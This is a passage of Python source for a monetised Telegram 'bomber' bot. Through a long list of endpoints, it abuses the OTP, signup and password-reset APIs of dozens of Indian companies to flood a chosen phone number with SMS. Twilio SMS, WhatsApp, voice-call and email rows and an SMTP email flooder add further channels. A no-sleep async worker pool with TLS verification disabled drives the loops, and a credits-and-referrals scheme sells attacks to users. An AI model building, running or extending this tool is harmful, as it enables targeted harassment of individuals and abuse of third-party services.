     "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
     {"Content-Type": "application/json",
      "origin": "https://www.makemytrip.com"},
     {"loginId": "{target}", "type": "MOBILE", "version": 2, "countryCode": "91"}),

    ("legacy:Oyo", "legacy", "POST",
     "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
     {"Content-Type": "text/plain;charset=UTF-8",
      "origin": "https://www.oyorooms.com"},
     {"phone": "{target}", "country_code": "+91", "nod": 4}),

    ("legacy:EasyMyTrip", "legacy", "POST",
     "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
     {"Content-Type": "application/json; charset=UTF-8",
      "origin": "https://mybookings.easemytrip.com"},
     {"emailph": "{target}"}),

    ("legacy:Happyeasygo", "legacy", "GET",
     "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target}&verifycode=FDCA",
     {"x-device": "mobile",
      "origin": "https://m.happyeasygo.com"}, None),

    ("legacy:ConfirmTkt", "legacy", "GET",
     "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={target}",
     {}, None),

    # ── Cabs ──
    ("legacy:Ola", "legacy", "POST",
     "https://accounts.olacabs.com/api/login",
     {"Content-Type": "application/json",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://accounts.olacabs.com"},
     {"mobileNumber": "{target}", "dialingCode": "+91", "countryCode": "IN"}),

    ("legacy:OlaV1", "legacy", "POST",
     "https://accounts.olacabs.com/api/v1/login",
     {"Content-Type": "application/json",
      "origin": "https://accounts.olacabs.com"},
     {"mobileNumber": "{target}", "dialingCode": "+91", "countryCode": "IN"}),

    ("legacy:Uber", "legacy", "POST",
     "https://auth.uber.com/api/v1/signup",
     {"Content-Type": "application/json",
      "origin": "https://auth.uber.com"},
     {"phone": "{target}", "country_code": "+91"}),

    ("legacy:Rapido", "legacy", "POST",
     "https://customer.rapido.bike/api/otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:MeruCab", "legacy", "POST",
     "https://merucabapp.com/api/otp/generate",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobile_number={target}"),

    ("legacy:GoPinkCabs", "legacy", "POST",
     "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=check_mobile_number=1&contact={target}"),

    # ── Food ──
    ("legacy:Zomato", "legacy", "POST",
     "https://www.zomato.com/webroutes/auth/login",
     {"Content-Type": "application/json",
      "origin": "https://www.zomato.com"},
     {"country_id": 1, "phone": "{target}",
      "verification_type": "sms", "method": "phone"}),

    ("legacy:Swiggy", "legacy", "POST",
     "https://www.swiggy.com/mapi/auth/signup",
     {"Content-Type": "application/json",
      "origin": "https://www.swiggy.com"},
     {"name": "test", "email": "test@example.com",
      "password": "test12345", "referral_code": "",
      "mobile": "{target}"}),

    ("legacy:Domino", "legacy", "POST",
     "https://api.dominos.co.in/loginhandler/forgotpassword",
     {"Content-Type": "application/json",
      "origin": "https://m.dominos.co.in"},
     {"lastName": "", "mobile": "{target}", "firstName": ""}),

    ("legacy:PizzaHut", "legacy", "POST",
     "https://api.pizzahut.io/v1/otp/generate",
     {"Content-Type": "application/json; charset=utf-8",
      "origin": "https://www.pizzahut.co.in"},
     {"phone": "+91{target}"}),

    ("legacy:KFC", "legacy", "POST",
     "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://online.kfc.co.in"},
     {"phoneNumber": "{target}", "AuthorizedFor": "3", "Resend": "false"}),

    ("legacy:BurgerKing", "legacy", "POST",
     "https://consumer-apis.burgerking.in/api/v1/user/signUp",
     {"Content-Type": "application/json",
      "platform": "web", "type": "dinein",
      "origin": "https://www.burgerking.in"},
     {"phone_no": "{target}"}),

    ("legacy:Dineout", "legacy", "POST",
     "https://www.dineout.co.in/xhrajaxrequest/user_signup",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://www.dineout.co.in"},
     "_raw=name=Test+User&email=test%40example.com&phone={target}"),

    # ── Gaming ──
    ("legacy:RummyCircle", "legacy", "POST",
     "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"phone": "{target}",
      "isPlaycircle": "72abdd9a-7038-41c0-a57d-d0022dac60da",
      "deviceName": "Android", "refCode": ""}),

    ("legacy:My11Circle", "legacy", "POST",
     "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:PokerBaazi", "legacy", "POST",
     "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "mfa_channels": "phno"}),

    ("legacy:Dream11", "legacy", "POST",
     "https://www.dream11.com/graphql/mutation/pwa/register",
     {"Content-Type": "application/json",
      "device": "pwa",
      "origin": "https://www.dream11.com"},
     {"query": "mutation register($email:String!$mobileNumber:String!$password:String!$site:String){registerSendOTPMutation(email:$email mobileNumber:$mobileNumber password:$password site:$site){message}}",
      "variables": {"email": "test@example.com",
                    "mobileNumber": "{target}",
                    "password": "TestPass123"}}),

    ("legacy:BigCash", "legacy", "GET",
     "https://www.bigcash.live/sendsms.php?mobile={target}&ip=192.168.1.1",
     {"Referer": "https://www.bigcash.live/games/poker"}, None),

    ("legacy:A23Games", "legacy", "POST",
     "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "device_id": "android123",
      "model": "Google,Android SDK built for x86,10",
      "otp": "", "referBy": "", "signup": True, "version": "1.0.5"}),

    ("legacy:Howzat", "legacy", "POST",
     "https://mercury.howzat.com/api/auth/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    # ── Jobs ──
    ("legacy:WorkIndia", "legacy", "GET",
     "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={target}&version_number=623",
     {}, None),

    ("legacy:Apna", "legacy", "POST",
     "https://production.apna.co/api/userprofile/v1/otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hash_type": "play_store"}),

    ("legacy:ApnaAlt", "legacy", "POST",
     "https://apna.co/api/userprofile/v1/otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hash_type": "play_store"}),

    # ── OTP services ──
    ("legacy:Otpless", "legacy", "POST",
     "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "selectedCountryCode": "+91"}),

    ("legacy:NewMe", "legacy", "POST",
     "https://prodapi.newme.asia/web/otp/request",
     {"Content-Type": "application/json"},
     {"mobile_number": "{target}", "resend_otp_request": True}),

    ("legacy:HyugaAuth", "legacy", "POST",
     "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:TooToo", "legacy", "POST",
     "https://tootoo.in/graphql",
     {"Content-Type": "application/json"},
     {"query": "query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename }}",
      "variables": {"mobile_no": "{target}", "resend": 0}}),

    ("legacy:SmartCoin", "legacy", "GET",
     "https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/SMS?phoneNumber={target}",
     {}, None),

    ("legacy:Docon", "legacy", "POST",
     "https://docon.co.in/api/v1/user/online-login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:DaycoIndia", "legacy", "POST",
     "https://ekyc.daycoindia.com/api/nscript_functions.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=api=send_otp&brand=dayco&mob={target}&resend_otp=resend_otp"),

    ("legacy:SnitchSMS", "legacy", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),

    ("legacy:SnitchResendSMS", "legacy", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/sms",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),

    ("legacy:BeepKart", "legacy", "POST",
     "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "city": 362}),

    ("legacy:BikeFixup", "legacy", "POST",
     "https://api.bikefixup.com/api/v2/send-registration-otp",
     {"Content-Type": "application/json; charset=UTF-8"},
     {"phone": "{target}", "app_signature": "4pFtQJwcz6y"}),

    ("legacy:Animall", "legacy", "POST",
     "https://animall.in/zap/auth/login",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "signupPlatform": "NATIVE_ANDROID"}),

    ("legacy:DeHaat", "legacy", "POST",
     "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "client_id": "kisan-app"}),

    ("legacy:Khatabook", "legacy", "POST",
     "https://api.khatabook.com/v1/auth/request-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "app_signature": "wk+avHrHZf2"}),

    ("legacy:Vyapar", "legacy", "GET",
     "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={target}",
     {}, None),

    ("legacy:Kredily", "legacy", "POST",
     "https://app.kredily.com/ws/v1/accounts/send-otp/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:MamaEarth", "legacy", "POST",
     "https://auth.mamaearth.in/v1/auth/initiate-signup",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "referralCode": ""}),

    ("legacy:HomeTriangle", "legacy", "POST",
     "https://hometriangle.com/api/partner/xauth/signup/otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:MyGov", "legacy", "GET",
     "https://auth.mygov.in/regapi/register_api_ver1/?api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&phone={target}",
     {}, None),

    ("legacy:CodFirm", "legacy", "GET",
     "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{target}&email=&storeUrl=bellavita1.myshopify.com",
     {}, None),

    ("legacy:ShipRocket", "legacy", "POST",
     "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     {"Content-Type": "application/json"},
     {"mobileNumber": "{target}"}),

    ("legacy:AstroSage", "legacy", "GET",
     "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={target}",
     {}, None),

    ("legacy:Nykaa", "legacy", "POST",
     "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobile_number={target}&source=sms&platform=ANDROID&domain=nykaa"),

    ("legacy:Quikr", "legacy", "POST",
     "https://www.quikr.com/core/sendOtp",
     {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "origin": "https://www.quikr.com"},
     "_raw=user={target}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88"),

    ("legacy:Gaana", "legacy", "POST",
     "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
     {"Content-Type": "application/json; charset=utf-8",
      "channel": "gaana.com",
      "platform": "android"},
     {"mobile": "+91-{target}"}),

    ("legacy:BookMyShow", "legacy", "POST",
     "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
     {"Content-Type": "application/json",
      "origin": "https://in.bookmyshow.com"},
     {"channel": "phone", "subChannel": "sms",
      "details": {"phone": "{target}",
                  "origin": "https://in.bookmyshow.com"}}),

    ("legacy:ASVMFaizabad", "legacy", "POST",
     "http://asvmfaizabad.org/register.php",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "http://asvmfaizabad.org"},
     "_raw=sname=Test&sclass=XII&sphone={target}&spassword=test1234&ssection=A&submit="),
]


# ─────────────────────────────────────────────────────────────
# TWILIO ROWS (only if creds present)
# ─────────────────────────────────────────────────────────────
def twilio_rows():
    if not TW_SID or not TW_TOKEN or not TW_FROM:
        return []
    return [
        ("tw:TwilioSMS", "sms", "POST",
         f"https://api.twilio.com/2010-04-01/Accounts/{TW_SID}/Messages.json",
         f"Content-Type: application/x-www-form-urlencoded\nX-Basic-Auth: {TW_SID}:{TW_TOKEN}",
         f"To=%2B{{target}}&From=%2B{TW_FROM.lstrip('+')}&Body={{msg}}"),
        ("tw:TwilioWhatsApp", "whatsapp", "POST",
         f"https://api.twilio.com/2010-04-01/Accounts/{TW_SID}/Messages.json",
         f"Content-Type: application/x-www-form-urlencoded\nX-Basic-Auth: {TW_SID}:{TW_TOKEN}",
         f"To=whatsapp%3A%2B{{target}}&From=whatsapp%3A%2B{TW_FROM.lstrip('+')}"
         + (f"&ContentSid={TW_CONTENT_SID}" if TW_CONTENT_SID else "&Body={msg}")),
        ("tw:TwilioCall", "call", "POST",
         f"https://api.twilio.com/2010-04-01/Accounts/{TW_SID}/Calls.json",
         f"Content-Type: application/x-www-form-urlencoded\nX-Basic-Auth: {TW_SID}:{TW_TOKEN}",
         "To=%2B{target}&From=%2B" + TW_FROM.lstrip("+") +
         "&Twiml=%3CResponse%3E%3CSay+voice%3D%22alice%22%3E{msg}%3C%2FSay%3E%3C%2FResponse%3E"),
        ("tw:TwilioEmail", "email", "POST",
         "https://comms.twilio.com/v1/Emails",
         f"Content-Type: application/json\nX-Basic-Auth: {TW_SID}:{TW_TOKEN}",
         json.dumps({
             "from": {"address": TW_EMAIL_FROM, "name": "Support"},
             "to": [{"address": "{target}"}],
             "content": {"subject": "{msg}", "html": "<p><b>{msg}</b></p>"},
         })),
    ]


# ─────────────────────────────────────────────────────────────
# SEED HELPERS
# ─────────────────────────────────────────────────────────────
def _body_to_string(d):
    if d is None:
        return ""
    if isinstance(d, str):
        return d
    if isinstance(d, dict):
        if "_raw" in d:
            return str(d["_raw"])
        return json.dumps(d, separators=(",", ":"), ensure_ascii=False)
    return str(d)


def _headers_to_string(h):
    if not h:
        return ""
    if isinstance(h, str):
        return h
    return "\n".join(f"{k}: {v}" for k, v in h.items())


def seed_all_endpoints(force_refresh=False):
    """Insert/refresh all endpoints. Idempotent by name."""
    added = 0
    # master
    for name, cat, method, url, headers, body in MASTER_ENDPOINTS:
        if not force_refresh and _exec("SELECT 1 FROM apis WHERE name=?",
                                       (name,), fetch="one"):
            continue
        if force_refresh:
            _exec("DELETE FROM apis WHERE name=?", (name,))
        _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,"
              "active,created_at) VALUES(?,?,?,?,?,?,?,?,?)",
              (name, "http", cat, url, method,
               _body_to_string(body), _headers_to_string(headers),
               1, int(time.time())))
        added += 1
    # twilio
    for name, cat, method, url, headers, body in twilio_rows():
        _exec("DELETE FROM apis WHERE name=?", (name,))
        _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,"
              "active,created_at) VALUES(?,?,?,?,?,?,?,?,?)",
              (name, "http", cat, url, method, body, headers,
               1, int(time.time())))
        added += 1
    log.info("seed: +%d endpoints", added)


# ─────────────────────────────────────────────────────────────
# INIT DB
# ─────────────────────────────────────────────────────────────
def init_db():
    _conn.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id       INTEGER PRIMARY KEY,
        username      TEXT,
        first_name    TEXT,
        credits       INTEGER DEFAULT 0,
        banned        INTEGER DEFAULT 0,
        last_bomb     INTEGER DEFAULT 0,
        total_bombs   INTEGER DEFAULT 0,
        last_daily    INTEGER DEFAULT 0,
        referred_by   INTEGER,
        ref_count     INTEGER DEFAULT 0,
        vip_cost      INTEGER DEFAULT 0,
        created_at    INTEGER
    );
    CREATE TABLE IF NOT EXISTS admins (
        user_id    INTEGER PRIMARY KEY,
        added_by   INTEGER,
        added_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS redeem_codes (
        code        TEXT PRIMARY KEY,
        amount      INTEGER NOT NULL,
        max_uses    INTEGER NOT NULL,
        used        INTEGER DEFAULT 0,
        created_by  INTEGER,
        created_at  INTEGER,
        active      INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS redeem_uses (
        code     TEXT,
        user_id  INTEGER,
        used_at  INTEGER,
        PRIMARY KEY (code, user_id)
    );
    CREATE TABLE IF NOT EXISTS apis (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        name         TEXT UNIQUE,
        channel      TEXT DEFAULT 'http',
        category     TEXT DEFAULT 'legacy',
        url          TEXT NOT NULL,
        method       TEXT DEFAULT 'GET',
        body         TEXT DEFAULT '',
        headers      TEXT DEFAULT '',
        active       INTEGER DEFAULT 1,
        fail_streak  INTEGER DEFAULT 0,
        ok_count     INTEGER DEFAULT 0,
        fail_count   INTEGER DEFAULT 0,
        created_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS smtp_accounts (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        host        TEXT,
        port        INTEGER,
        username    TEXT,
        password    TEXT,
        from_name   TEXT DEFAULT '',
        use_tls     INTEGER DEFAULT 1,
        active      INTEGER DEFAULT 1,
        fail_streak INTEGER DEFAULT 0,
        ok_count    INTEGER DEFAULT 0,
        fail_count  INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS bomb_history (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        target   TEXT,
        count    INTEGER,
        msg      TEXT,
        ok       INTEGER,
        fail     INTEGER,
        category TEXT,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS blacklist (
        target   TEXT PRIMARY KEY,
        added_by INTEGER,
        added_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS settings (
        key   TEXT PRIMARY KEY,
        value TEXT
    );
    CREATE TABLE IF NOT EXISTS logs (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        action   TEXT,
        detail   TEXT,
        ts       INTEGER
    );
    """)

    if not _col_exists("apis", "category"):
        _conn.execute("ALTER TABLE apis ADD COLUMN category TEXT DEFAULT 'legacy'")
    if not _col_exists("bomb_history", "category"):
        _conn.execute("ALTER TABLE bomb_history ADD COLUMN category TEXT")

    for key, val in (
        ("bomb_cost",      DEFAULT_BOMB_COST),
        ("max_count",      DEFAULT_MAX_COUNT),
        ("cooldown",       DEFAULT_COOLDOWN),
        ("concurrency",    DEFAULT_CONCURRENCY),
        ("daily_bonus",    DEFAULT_DAILY_BONUS),
        ("referral_bonus", REFERRAL_BONUS),
        ("maintenance",    0),
        ("country_code",   "91"),
        ("flood_cost_per_min", FLOOD_COST_PER_MIN),
    ):
        _conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)",
                      (key, str(val)))

    if _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"] == 0:
        for uid in ADMIN_IDS_ENV:
            _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) "
                  "VALUES(?,?,?)", (uid, 0, int(time.time())))

    seed_all_endpoints()


# ─────────────────────────────────────────────────────────────
# SETTINGS
# ─────────────────────────────────────────────────────────────
def setting(key, cast=str):
    row = _exec("SELECT value FROM settings WHERE key=?", (key,), fetch="one")
    return cast(row["value"]) if row else None


def set_setting(key, value):
    _exec("INSERT INTO settings(key,value) VALUES(?,?) "
          "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
          (key, str(value)))


# ─────────────────────────────────────────────────────────────
# USER CRUD
# ─────────────────────────────────────────────────────────────
def get_user(uid):
    return _exec("SELECT * FROM users WHERE user_id=?", (uid,), fetch="one")


def ensure_user(u: types.User, referrer=None):
    row = get_user(u.id)
    if not row:
        _exec("INSERT INTO users(user_id,username,first_name,credits,"
              "referred_by,created_at) VALUES(?,?,?,?,?,?)",
              (u.id, u.username or "", u.first_name or "", 0,
               referrer, int(time.time())))
        if referrer and referrer != u.id:
            bonus = setting("referral_bonus", int)
            add_credits(referrer, bonus)
            _exec("UPDATE users SET ref_count=ref_count+1 WHERE user_id=?",
                  (referrer,))
        row = get_user(u.id)
    else:
        _exec("UPDATE users SET username=?, first_name=? WHERE user_id=?",
              (u.username or "", u.first_name or "", u.id))
    return row


def add_credits(uid, amount):
    _exec("UPDATE users SET credits=credits+? WHERE user_id=?", (amount, uid))


def take_credits(uid, amount):
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET credits=credits-? WHERE user_id=? AND credits>=?",
            (amount, uid, amount))
        return cur.rowcount > 0


# ─────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────
def log_action(uid, action, detail=""):
    _exec("INSERT INTO logs(user_id,action,detail,ts) VALUES(?,?,?,?)",
          (uid, action, detail[:500], int(time.time())))


def prune_logs():
    cutoff = int(time.time()) - LOG_RETENTION_DAYS * 86400
    with _conn:
        _conn.execute("DELETE FROM logs WHERE ts < ?", (cutoff,))


# ─────────────────────────────────────────────────────────────
# UTIL
# ─────────────────────────────────────────────────────────────
def gen_code(n=10):
    return "".join(secrets.choice(string.ascii_uppercase + string.digits)
                   for _ in range(n))


def is_admin(uid):
    return _exec("SELECT 1 FROM admins WHERE user_id=?",
                 (uid,), fetch="one") is not None


def is_blacklisted(target):
    return _exec("SELECT 1 FROM blacklist WHERE target=?",
                 (target,), fetch="one") is not None


def fmt_target(raw, category):
    if "@" in raw:
        return raw
    digits = "".join(c for c in raw if c.isdigit())
    if category == "legacy":
        if len(digits) > 10:
            digits = digits[-10:]
        return digits
    if len(digits) == 10:
        digits = setting("country_code") + digits
    return digits


# ─────────────────────────────────────────────────────────────
# MIDDLEWARE
# ─────────────────────────────────────────────────────────────
class AutoRegisterMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = getattr(event, "from_user", None)
        if u and not u.is_bot:
            ensure_user(u)
        return await handler(event, data)


# ─────────────────────────────────────────────────────────────
# BOMBER ENGINE — MILLISECOND WORKER POOL
# ─────────────────────────────────────────────────────────────
def _render(template, target, msg):
    if not template:
        return ""
    return (template
            .replace("{target}", target)
            .replace("{phone}", target)
            .replace("{msg}", msg))


def _parse_headers(raw):
    out = {}
    if not raw:
        return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


async def _hit_http(session, row, target, msg):
    url = _render(row["url"], target, msg)
    method = (row["method"] or "GET").upper()
    body = _render(row["body"], target, msg)
    headers = _parse_headers(row["headers"])

    if "X-Basic-Auth" in headers:
        creds = headers.pop("X-Basic-Auth")
        headers["Authorization"] = "Basic " + base64.b64encode(
            creds.encode()).decode()

    timeout = aiohttp.ClientTimeout(total=8, connect=4)
    try:
        data_bytes = body.encode("utf-8") if body else None
        if method == "POST":
            async with session.post(url, data=data_bytes, headers=headers,
                                    timeout=timeout, ssl=False) as r:
                await r.read()
                return 200 <= r.status < 400
        elif method == "PUT":
            async with session.put(url, data=data_bytes, headers=headers,
                                   timeout=timeout, ssl=False) as r:
                await r.read()
                return 200 <= r.status < 400
        else:
            async with session.get(url, headers=headers, timeout=timeout,
                                   ssl=False) as r:
                await r.read()
                return 200 <= r.status < 400
    except Exception as e:
        log.debug("http fail %s: %s", row["name"], e)
        return False


async def _send_email(smtp_row, target, msg):
    try:
        m = MIMEText(msg)
        m["Subject"] = "Notification"
        m["From"] = formataddr((smtp_row["from_name"] or smtp_row["username"],
                                smtp_row["username"]))
        m["To"] = target
        m["Date"] = formatdate(localtime=True)
        m["Message-ID"] = make_msgid()

        port = smtp_row["port"]
        if port == 465:
            c = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port,
                                timeout=20, use_tls=True)
            await c.connect()
        else:
            c = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port,
                                timeout=20, use_tls=False)
            await c.connect()
            if smtp_row["use_tls"]:
                await c.starttls()
        await c.login(smtp_row["username"], smtp_row["password"])
        await c.send_message(m)
        await c.quit()
        return True
    except Exception as e:
        log.debug("smtp fail %s: %s", smtp_row["username"], e)
        return False


def _update_api_health(api_id, ok):
    try:
        if ok:
            _exec("UPDATE apis SET ok_count=ok_count+1, fail_streak=0 "
                  "WHERE id=?", (api_id,))
        else:
            _exec("UPDATE apis SET fail_count=fail_count+1, "
                  "fail_streak=fail_streak+1 WHERE id=?", (api_id,))
            r = _exec("SELECT fail_streak FROM apis WHERE id=?",
                      (api_id,), fetch="one")
            if r and r["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE apis SET active=0 WHERE id=?", (api_id,))
    except Exception:
        pass


def _update_smtp_health(sid, ok):
    try:
        if ok:
            _exec("UPDATE smtp_accounts SET ok_count=ok_count+1, "
                  "fail_streak=0 WHERE id=?", (sid,))
        else:
            _exec("UPDATE smtp_accounts SET fail_count=fail_count+1, "
                  "fail_streak=fail_streak+1 WHERE id=?", (sid,))
            r = _exec("SELECT fail_streak FROM smtp_accounts WHERE id=?",
                      (sid,), fetch="one")
            if r and r["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE smtp_accounts SET active=0 WHERE id=?", (sid,))
    except Exception:
        pass


async def bomb_engine(targets, budget, msg, categories, stop_ev=None,
                      progress_cb=None):
    """
    Millisecond-repeat engine.
    - Builds worker pool across every active API in `categories`.
    - Each worker loops its API continuously, no sleep.
    - Shared budget counter decrements without awaits (asyncio single-thread).
    - Returns (ok, fail, err).
    """
    if isinstance(targets, str):
        targets = [targets]

    ph = ",".join("?" * len(categories))
    apis = _exec(
        f"SELECT * FROM apis WHERE active=1 AND channel='http' "
        f"AND category IN ({ph})",
        tuple(categories), fetch="all")

    smtp_accounts = []
    if "email" in categories or "smtp" in categories:
        smtp_accounts = _exec("SELECT * FROM smtp_accounts WHERE active=1",
                              fetch="all")

    if not apis and not smtp_accounts:
        return 0, 0, "no active channels for that category"

    concurrency = setting("concurrency", int) or DEFAULT_CONCURRENCY
    # total workers: min(concurrency, budget) but at least 1 per API
    total_workers = min(max(concurrency, len(apis)), max(1, budget))
    total_workers = min(total_workers, budget)

    ok = [0]
    fail = [0]
    remaining = [budget]
    last_report = [0.0]

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=300,
        use_dns_cache=True,
        ssl=False,
    )
    session = aiohttp.ClientSession(connector=connector,
                                    auto_decompress=False)

    async def worker(session, api, target):
        while remaining[0] > 0 and not (stop_ev and stop_ev.is_set()):
            remaining[0] -= 1
            hit = await _hit_http(session, api, target, msg)
            if hit:
                ok[0] += 1
            else:
                fail[0] += 1
            _update_api_health(api["id"], hit)
            # progress tick — no await unless reporting
            if progress_cb:
                now = time.time()
                if now - last_report[0] >= 1.5:
                    last_report[0] = now
                    try:
                        await progress_cb(ok[0], fail[0], budget - remaining[0])
                    except Exception:
                        pass

    try:
        tasks = []
        for i in range(total_workers):
            api = apis[i % len(apis)] if apis else None
            tgt = targets[i % len(targets)]
            if api is None and smtp_accounts:
                # email worker
                smtp = smtp_accounts[i % len(smtp_accounts)]
                tasks.append(asyncio.create_task(
                    _email_worker(session, smtp, tgt, msg, remaining,
                                  ok, fail, stop_ev)))
            elif api:
                tasks.append(asyncio.create_task(
                    worker(session, api, tgt)))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        try:
            await session.close()
        except Exception:
            pass

    return ok[0], fail[0], None


async def _email_worker(session, smtp, target, msg, remaining, ok, fail, stop_ev):
    while remaining[0] > 0 and not (stop_ev and stop_ev.is_set()):
        remaining[0] -= 1
        r = await _send_email(smtp, target, msg)
        _update_smtp_health(smtp["id"], r)
        if r:
            ok[0] += 1
        else:
            fail[0] += 1


# ─────────────────────────────────────────────────────────────
# BOT + DISPATCHER
# ─────────────────────────────────────────────────────────────
bot = Bot(token=BOT_TOKEN,
          default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
dp.message.middleware(AutoRegisterMiddleware())
dp.callback_query.middleware(AutoRegisterMiddleware())

BOMB_STOPS = {}


# ─────────────────────────────────────────────────────────────
# FSM
# ─────────────────────────────────────────────────────────────
class UserFSM(StatesGroup):
    bomb_target   = State()
    bomb_count    = State()
    flood_target  = State()
    redeem_code   = State()


class AdminFSM(StatesGroup):
    add_credits_uid  = State()
    add_credits_amt  = State()
    ded_credits_uid  = State()
    ded_credits_amt  = State()
    redeem_amount    = State()
    redeem_uses      = State()
    api_name         = State()
    api_category     = State()
    api_url          = State()
    api_method       = State()
    api_body         = State()
    api_headers      = State()
    smtp_host        = State()
    smtp_port        = State()
    smtp_user        = State()
    smtp_pass        = State()
    smtp_name        = State()
    broadcast        = State()
    find_user        = State()
    edit_setting     = State()
    blacklist_add    = State()
    vip_uid          = State()
    vip_cost         = State()
    add_admin_id     = State()
    remove_admin_id  = State()


# ─────────────────────────────────────────────────────────────
# KEYBOARDS
# ─────────────────────────────────────────────────────────────
def main_menu_kb(admin=False):
    rows = [
        [InlineKeyboardButton(text="💣 Start Bomb",  callback_data="m:bomb"),
         InlineKeyboardButton(text="☢️ Flood Mode",  callback_data="m:flood")],
        [InlineKeyboardButton(text="💰 Balance",     callback_data="m:bal"),
         InlineKeyboardButton(text="🎁 Redeem",      callback_data="m:redeem")],
        [InlineKeyboardButton(text="📜 History",     callback_data="m:hist"),
         InlineKeyboardButton(text="🎉 Daily Bonus", callback_data="m:daily")],
        [InlineKeyboardButton(text="📊 Stats",       callback_data="m:stats"),
         InlineKeyboardButton(text="📖 Help",        callback_data="m:help")],
        [InlineKeyboardButton(text="📞 Contact Admin",
